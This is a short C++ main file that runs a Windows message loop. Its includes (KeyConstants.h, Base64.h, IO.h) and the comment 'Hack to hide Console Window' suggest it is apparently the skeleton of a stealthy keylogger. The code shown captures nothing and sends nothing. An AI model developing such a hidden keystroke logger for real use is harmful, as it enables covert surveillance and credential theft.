#include <iostream>
#include "windows.h"
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"

using namespace std;

int main ()
{
    // Hack to hide Console Window
    MSG Msg;
    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    return 0;
}
